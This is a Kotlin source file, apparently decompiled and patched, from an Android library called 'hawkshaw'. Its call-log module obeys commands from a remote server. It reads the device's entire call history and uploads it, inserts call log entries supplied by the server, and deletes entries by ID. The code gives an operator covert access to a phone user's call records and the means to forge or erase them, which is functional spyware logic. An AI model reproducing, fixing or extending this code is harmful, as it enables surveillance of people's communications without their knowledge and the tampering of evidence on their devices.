package com.hawkshaw.library.features.telephony.calllogs

import android.net.Uri
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.PushCallLogsRequest
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt
import com.hawkshaw.library.logger.Logger
import kotlin.coroutines.Continuation
import kotlin.coroutines.intrinsics.COROUTINE_SUSPENDED
import kotlin.jvm.internal.Intrinsics
import com.hawkshaw.library.datalayer.models.CallLog as CallLogModel // Alias for clarity
import android.util.Log // Added for logging

// Mimicking the Java TAG constant
private const val TAG = "CallLogsHandler"

/**
 * Adds a call log entry based on the provided request.
 *
 * @param addCallLogRequest The request containing call log data to add.
 */
private fun addCallLog(addCallLogRequest: Command.AddCallLogRequest?) {
    Log.d(TAG, "[DEBUG] addCallLog called with request: $addCallLogRequest")
    if (addCallLogRequest != null) {
        val hasPermission = ManifestPermissionsKt.hasPermission("android.permission.WRITE_CALL_LOG")
        Log.d(TAG, "[DEBUG] addCallLog: WRITE_CALL_LOG permission: $hasPermission")
        if (!hasPermission) {
            // FIXED: Logger.e signature
            Logger.e(TAG, "AddCallLog: You don't have permission to write call logs", null, false, 12, null)
            Log.w(TAG, "[DEBUG] addCallLog: Permission denied. Returning.")
            return
        }
        // FIXED: Access 'callLog' property directly
        val callLogData = addCallLogRequest.callLog
        Log.d(TAG, "[DEBUG] addCallLog: Processing callLogData: $callLogData")
        val uri: Uri? = addCallLog(App.getContext(), callLogData)
        Log.d(TAG, "[DEBUG] addCallLog: Result URI from addCallLog (core function): $uri")
        // FIXED: Access 'callLog.name' property directly and Logger.d signature
        Logger.d(TAG, "AddCallLog: " + uri + ", " + addCallLogRequest.callLog.name, false, 4, null)
    } else {
        Log.d(TAG, "[DEBUG] addCallLog: addCallLogRequest was null.")
    }
}

/**
 * Deletes a call log entry based on the provided request.
 *
 * @param deleteCallLogRequest The request containing the ID of the call log to delete.
 */
private fun deleteCallLog(deleteCallLogRequest: Command.DeleteCallLogRequest?) {
    Log.d(TAG, "[DEBUG] deleteCallLog called with request: $deleteCallLogRequest")
    if (deleteCallLogRequest != null) {
        val hasPermission = ManifestPermissionsKt.hasPermission("android.permission.WRITE_CALL_LOG")
        Log.d(TAG, "[DEBUG] deleteCallLog: WRITE_CALL_LOG permission: $hasPermission")
        if (!hasPermission) {
            // FIXED: Logger.e signature
            Logger.e(TAG, "DeleteCallLog: You don't have permission to write call logs", null, false, 12, null)
            Log.w(TAG, "[DEBUG] deleteCallLog: Permission denied. Returning.")
            return
        }
        // FIXED: Access 'id' property directly
        val callLogId = deleteCallLogRequest.id
        Log.d(TAG, "[DEBUG] deleteCallLog: Processing callLogId: $callLogId")
        val success = deleteCallLog(App.getContext(), callLogId)
        Log.d(TAG, "[DEBUG] deleteCallLog: Result from deleteCallLog (core function): $success")
        // FIXED: Access 'id' property directly and Logger.d signature
        Logger.d(TAG, StringBuilder().append("DeleteCallLog: ").append(if (success) "Success" else "Failed").append(" for ").append(deleteCallLogRequest.id).toString(), false, 4, null)
    } else {
        Log.d(TAG, "[DEBUG] deleteCallLog: deleteCallLogRequest was null.")
    }
}

/**
 * Handles incoming call logs commands from the server.
 *
 * @param command The Command object containing the call log operation.
 * @param continuation The Kotlin coroutine continuation.
 * @return Any result, typically Unit or COROUTINE_SUSPENDED.
 */
suspend fun handleCallLogsCommand(command: Command, eVar: Continuation<Any>): Any {
    Log.d(TAG, "[DEBUG] handleCallLogsCommand called with command type: ${command.type}, command: $command, eVar: $eVar")
    Intrinsics.checkNotNullParameter(command, "command")
    Intrinsics.checkNotNullParameter(eVar, "eVar")

    // FIXED: Access 'type' property directly
    val commandType = command.type // Store for logging
    Log.d(TAG, "[DEBUG] handleCallLogsCommand: Command type is $commandType")
    val commandTypeOrdinal = command.type.ordinal
    val unitInstance = Unit

    val i5: Int = when (command.type) { // FIXED: Access 'type' property directly
        Command.CommandType.PushCallLogs -> 1
        Command.CommandType.AddCallLog -> 2
        Command.CommandType.DeleteCallLog -> 3
        else -> {
            Log.d(TAG, "[DEBUG] handleCallLogsCommand: Unhandled command type: ${command.type}")
            -1
        }
    }
    Log.d(TAG, "[DEBUG] handleCallLogsCommand: Mapped i5 value: $i5 for command type: ${command.type}")

    if (i5 != 1) {
        if (i5 == 2) {
            Log.d(TAG, "[DEBUG] handleCallLogsCommand: Handling AddCallLog. Request: ${command.addCallLogRequest}")
            // FIXED: Access 'addCallLogRequest' property directly
            addCallLog(command.addCallLogRequest)
        } else if (i5 == 3) {
            Log.d(TAG, "[DEBUG] handleCallLogsCommand: Handling DeleteCallLog. Request: ${command.deleteCallLogRequest}")
            // FIXED: Access 'deleteCallLogRequest' property directly
            deleteCallLog(command.deleteCallLogRequest)
        }
        Log.d(TAG, "[DEBUG] handleCallLogsCommand: Add/Delete operation finished. Returning Unit.")
        return unitInstance
    }

    Log.d(TAG, "[DEBUG] handleCallLogsCommand: Handling PushCallLogs. Calling pushCallLogs internal function.")
    val pushCallLogsResult = pushCallLogs(eVar)
    Log.d(TAG, "[DEBUG] handleCallLogsCommand: Result from pushCallLogs internal function: $pushCallLogsResult")

    return if (pushCallLogsResult === COROUTINE_SUSPENDED) {
        Log.d(TAG, "[DEBUG] handleCallLogsCommand: pushCallLogsResult is COROUTINE_SUSPENDED. Returning it.")
        pushCallLogsResult
    } else {
        Log.d(TAG, "[DEBUG] handleCallLogsCommand: pushCallLogsResult is not COROUTINE_SUSPENDED. Returning Unit.")
        unitInstance
    }
}

/**
 * Pushes call logs from the device to the server.
 *
 * @param eVar The Kotlin coroutine continuation.
 * @return Any result, typically Unit or COROUTINE_SUSPENDED.
 */
private suspend fun pushCallLogs(eVar: Continuation<Any>): Any {
    Log.d(TAG, "[DEBUG] pushCallLogs called with eVar: $eVar")
    Intrinsics.checkNotNullParameter(eVar, "eVar")

    val hasPermission = ManifestPermissionsKt.hasPermission("android.permission.READ_CALL_LOG")
    Log.d(TAG, "[DEBUG] pushCallLogs: READ_CALL_LOG permission: $hasPermission")
    if (!hasPermission) {
        // FIXED: Logger.e signature
        Logger.e(TAG, "ReadCallLogs: You don't have permission to read call logs", null, false, 12, null)
        Log.w(TAG, "[DEBUG] pushCallLogs: Permission denied. Returning Unit.")
        return Unit
    }

    val contentResolver = App.getContext().contentResolver
    Log.d(TAG, "[DEBUG] pushCallLogs: ContentResolver obtained. Calling getCallLogs (core function).")
    // Assuming getCallLogs returns a List<CallLogModel> or similar that can be cast
    val callLogsList = getCallLogs(contentResolver, null, eVar) // Pass null for deviceId as in original

    // Check if the result from getCallLogs was COROUTINE_SUSPENDED
    if (callLogsList === COROUTINE_SUSPENDED) {
        Log.d(TAG, "[DEBUG] pushCallLogs: getCallLogs returned COROUTINE_SUSPENDED. Propagating it.")
        return COROUTINE_SUSPENDED
    }

    val callLogs = callLogsList as List<CallLogModel> // Cast after checking for suspension
    Log.d(TAG, "[DEBUG] pushCallLogs: Retrieved ${callLogs.size} call logs.")

    // FIXED: Access Injector.INSTANCE
    val telephonyService = Injector.INSTANCE.telephonyService
    val request = PushCallLogsRequest(callLogs)
    // THE FIX IS HERE: Changed callLogs to calllogs
    Log.d(TAG, "[DEBUG] pushCallLogs: Created PushCallLogsRequest with ${request.calllogs?.size ?: 0} logs. Request: $request")

    Log.d(TAG, "[DEBUG] pushCallLogs: Calling telephonyService.pushCallLogs.")
    // FIXED: Explicit type cast for ApiResponse
    val response = telephonyService.pushCallLogs(request) as ApiResponse<*> // Cast to ApiResponse<*> to satisfy type checker
    Log.d(TAG, "[DEBUG] pushCallLogs: Response from telephonyService: $response, State: ${response.state}")

    // FIXED: Logger.d signature
    Logger.d(TAG, "PushCallLogs: " + response.state, false, 4, null)

    Log.d(TAG, "[DEBUG] pushCallLogs: Finished. Returning Unit.")
    return Unit
}





